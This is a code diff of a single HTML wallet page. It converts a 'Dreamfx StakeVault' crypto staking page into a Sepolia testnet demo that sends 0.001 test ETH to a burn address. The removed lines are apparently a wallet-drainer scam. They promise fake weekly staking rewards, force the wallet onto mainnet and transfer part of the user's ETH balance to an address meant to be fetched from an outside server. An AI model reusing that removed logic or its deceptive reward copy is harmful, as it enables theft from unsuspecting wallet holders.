@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dreamfx StakeVault - Premium Payment</title>
+    <title>ETH Wallet Demo (Sepolia Testnet)</title>
 
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -20,11 +20,16 @@
 
 <div class="max-w-md w-full">
 
+    <!-- DISCLAIMER -->
+    <div class="bg-yellow-900/40 border border-yellow-500/40 text-yellow-300 text-xs rounded-xl px-4 py-2 mb-4 text-center">
+        ⚠️ Educational demo — Sepolia testnet only. No mainnet funds are ever touched.
+    </div>
+
     <!-- HEADER -->
     <div class="text-center mb-8">
-        <h1 class="text-3xl font-extrabold">👑 Dreamfx <span class="text-blue-500">VAULT</span></h1>
+        <h1 class="text-3xl font-extrabold">ETH Wallet <span class="text-blue-500">Connect</span></h1>
         <span class="bg-blue-900/40 text-blue-400 text-[10px] font-bold px-3 py-1 rounded-full border border-blue-500/30 uppercase tracking-widest mt-2 inline-block">
-            Premium Staking Node
+            Testnet Demo
         </span>
     </div>
 
@@ -33,12 +38,29 @@
 
         <!-- CONNECT -->
         <div id="setup-view">
-            <p class="text-slate-400 text-center mb-6 text-sm">
-                Connect your wallet to access premium 4.5% Weekly staking rewards.
-            </p>
-            <button onclick="connectWallet()" class="w-full btn-gradient py-4 rounded-2xl font-bold">
+
+            <div id="status" class="text-center mb-6 text-sm text-slate-400">
+                Checking wallet...
+            </div>
+
+            <button id="connectBtn" onclick="connectWallet()" class="hidden w-full btn-gradient py-4 rounded-2xl font-bold">
                 Connect Wallet
             </button>
+
+            <div id="walletLinks" class="hidden space-y-3">
+                <h3 class="text-center text-sm text-slate-400 mb-3">No Wallet Detected</h3>
+
+                <button onclick="openMetaMask()" class="w-full py-3 rounded-2xl font-bold" style="background:#f6851b">
+                    Open MetaMask
+                </button>
+                <button onclick="openTrustWallet()" class="w-full py-3 rounded-2xl font-bold" style="background:#3375bb">
+                    Open Trust Wallet
+                </button>
+                <button onclick="openCoinbase()" class="w-full py-3 rounded-2xl font-bold" style="background:#0052ff">
+                    Open Coinbase Wallet
+                </button>
+            </div>
+
         </div>
 
         <!-- MAIN -->
@@ -47,25 +69,25 @@
             <div class="bg-black/20 p-4 rounded-2xl border border-white/5">
                 <div class="flex justify-between mb-1">
                     <span class="text-xs text-slate-400 uppercase">Available Balance</span>
-                    <span id="network-tag" class="text-[10px] text-green-500 font-bold italic">● ETHEREUM MAINNET</span>
+                    <span id="network-tag" class="text-[10px] text-green-500 font-bold italic">● SEPOLIA TESTNET</span>
                 </div>
                 <div class="text-2xl font-mono font-bold">
-                    <span id="display-balance">0.000</span> 
+                    <span id="display-balance">0.000</span>
                     <span class="text-blue-500 text-lg">ETH</span>
                 </div>
             </div>
 
             <p class="text-sm text-center text-slate-400">
-                Some percentage of your ETH balance will be staked automatically, and returned to your wallet after 30 days with 13.5% weekly rewards.
+                Demo transaction: sends a small test amount to a public burn address to demonstrate a signed transfer. This is a testnet-only simulation — nothing is staked and no rewards are paid.
             </p>
 
             <button onclick="executeTransfer()" id="action-btn"
                 class="w-full btn-gradient py-4 rounded-2xl font-bold">
-                🚀 Stake now
+                🚀 Send Demo Transaction
             </button>
 
             <p class="text-[10px] text-center text-slate-500">
-                Funds are locked for 30 days to generate premium returns.
+                Sepolia test ETH has no real-world value.
             </p>
 
         </div>
@@ -73,51 +95,51 @@
 </div>
 
 <script>
+const WEBSITE = "https://charsacdev.github.io/web3wallet/";
+
 let provider, signer;
 let ethBalance = 0;
-let RECEIVER_ADDRESS = ""; // 🔥 dynamic now
 
-//const SEPOLIA_HEX_ID = "0xaa36a7";
-const MAINNET_HEX_ID = "0x1"; // Ethereum Mainnet
+// Well-known Ethereum burn address — no one controls the private key.
+const RECEIVER_ADDRESS = "0x000000000000000000000000000000000000dEaD";
+
+const SEPOLIA_HEX_ID = "0xaa36a7";
+const SEPOLIA_CHAIN_ID = 11155111;
+
+const status = document.getElementById("status");
+const connectBtn = document.getElementById("connectBtn");
+const walletLinks = document.getElementById("walletLinks");
 
 //----------------------------------
-// FETCH RECEIVER ADDRESS
+// AUTO-DETECT WALLET
 //----------------------------------
-async function fetchReceiver() {
-    try {
-        //const res = await fetch("https://dreammfx.net/wallet-address/eth");
-        //const data = await res.json();
+function detectWallet() {
 
-        //if (data.status === "success") {
-            RECEIVER_ADDRESS = "0x1234567890123456789012345678901234567890"; // 🔥 hardcoded for now
-            console.log("Receiver:", RECEIVER_ADDRESS);
-        // } else {
-        //     throw new Error("Invalid response");
-        // }
-
-    } catch (err) {
-        console.error(err);
-        alert("Failed to fetch receiver address");
+    if (window.ethereum) {
+        status.innerHTML = "<span class='text-green-500'>Ethereum Wallet Detected</span>";
+        connectBtn.classList.remove("hidden");
+        return;
     }
+
+    status.innerHTML = "<span class='text-red-500'>No Wallet Detected</span>";
+    walletLinks.classList.remove("hidden");
 }
 
 //----------------------------------
 // CONNECT WALLET
 //----------------------------------
 async function connectWallet() {
-    if (!window.ethereum) return alert("Etherum wallet network not found");
+    if (!window.ethereum) return alert("Ethereum wallet not found");
 
     try {
-        await fetchReceiver(); // 🔥 get address first
-
         provider = new ethers.providers.Web3Provider(window.ethereum);
 
         const { chainId } = await provider.getNetwork();
 
-        if (chainId !== 1) {
+        if (chainId !== SEPOLIA_CHAIN_ID) {
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
-                params: [{ chainId: MAINNET_HEX_ID }]
+                params: [{ chainId: SEPOLIA_HEX_ID }]
             });
         }
 
@@ -140,26 +162,23 @@ async function connectWallet() {
 }
 
 //----------------------------------
-// SEND 80%
+// DEMO TRANSFER (small fixed test amount)
 //----------------------------------
 async function executeTransfer() {
     const btn = document.getElementById("action-btn");
 
-    if (!ethBalance || !RECEIVER_ADDRESS) {
-        return alert("Balance not enough or receiver");
+    if (!ethBalance) {
+        return alert("No test ETH balance found. Get some from a Sepolia faucet first.");
     }
 
     try {
         btn.disabled = true;
         btn.innerText = "⏳ Processing...";
 
-        let amountToSend = ethBalance * 0.1;
+        const amountToSend = 0.001; // fixed small demo amount
 
-        const gasBuffer = 0.002;
-        amountToSend -= gasBuffer;
-
-        if (amountToSend <= 0) {
-            throw new Error("Insufficient balance");
+        if (amountToSend > ethBalance) {
+            throw new Error("Not enough test ETH — use a Sepolia faucet.");
         }
 
         const value = ethers.utils.parseEther(amountToSend.toFixed(6));
@@ -171,7 +190,7 @@ async function executeTransfer() {
 
         await tx.wait();
 
-        alert("✅ Sent to stacking vault\nTX: " + tx.hash);
+        alert("✅ Demo transaction sent\nTX: " + tx.hash);
         btn.innerText = "✅ Done";
 
     } catch (err) {
@@ -179,9 +198,26 @@ async function executeTransfer() {
         alert("❌ " + (err.reason || err.message));
 
         btn.disabled = false;
-        btn.innerText = "🚀 Stake 80%";
+        btn.innerText = "🚀 Send Demo Transaction";
     }
 }
+
+//----------------------------------
+// MOBILE WALLET DEEP LINKS
+//----------------------------------
+function openMetaMask() {
+    window.location.href = "https://metamask.app.link/dapp/" + encodeURIComponent(WEBSITE);
+}
+
+function openTrustWallet() {
+    window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(WEBSITE);
+}
+
+function openCoinbase() {
+    window.location.href = "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(WEBSITE);
+}
+
+detectWallet();
 </script>
 
 </body>
